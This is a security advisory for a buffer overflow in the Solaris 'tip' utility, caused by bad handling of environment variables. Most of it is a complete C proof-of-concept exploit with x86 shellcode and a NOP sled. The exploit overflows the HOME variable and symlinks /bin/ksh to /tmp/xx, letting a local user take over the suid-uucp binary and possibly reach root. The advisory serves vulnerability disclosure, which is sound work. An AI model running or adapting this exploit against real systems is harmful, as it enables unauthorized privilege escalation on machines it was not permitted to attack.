source: http://www.securityfocus.com/bid/2475/info

tip is a utility included with Sun Microsystems Solaris Operating Environment. tip allows a user to establish a full duplex terminal connection with a remote host.

A problem with tip could lead to a buffer overflow. Due to the improper handling of environment variables by tip, it is possible to overflow a buffer in the program, and execute arbitrary code. The tip binary is suid uucp, and exploitation could lead to an euid of uucp.

Therefore, it is possible for a local user to execute arbitrary code, and gain an euid of uucp, with the potential of gaining privileges elevated to root.

#include <fcntl.h>

/*
   /usr/bin/tip overflow proof of conecpt.


   Pablo Sor, Buenos Aires, Argentina 03/2001
   psor@afip.gov.ar

   works against x86 solaris 7,8

   default offset should work.

*/


long get_esp() { __asm__("movl %esp,%eax"); }

int main(int ac, char **av)
{

char shell[]=
"\xeb\x0a\x9a\x01\x02\x03\x5c\x07\x04\xc3\xeb\x05"
"\xe8\xf9\xff\xff\xff\x5e\x29\xc0\x88\x46\xf7\x89\x46\xf2"
"\x50\xb0\x8d\xe8\xe0\xff\xff\xff\x6a\x05\x90\xb0\x17\xe8\xd6\xff\xff\xff"

"\xeb\x1f\x5e\x8d\x1e\x89\x5e\x0b\x29\xc0\x88\x46\x19\x89\x46\x14"
"\x89\x46\x0f\x89\x46\x07\xb0\x3b\x8d\x4e\x0b\x51\x51\x53\x50\xeb\x18"
"\xe8\xdc\xff\xff\xff\x2f\x74\x6d\x70\x2f\x78\x78\x01\x01\x01\x01\x02\x02"

"\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";

  unsigned long magic = get_esp() + 0x50;  /* default offset */
  unsigned char buf[600];

  symlink("/bin/ksh","/tmp/xx");
  memset(buf,0x90,600);
  buf[599]=0;
  memcpy(buf+(sizeof(buf)-strlen(shell)),shell,strlen(shell));
  memcpy(buf,"HOME=",5);
  memcpy(buf+265,&magic,4);
  putenv(buf);

  system("/usr/bin/tip 5");
  unlink("/tmp/xx");
}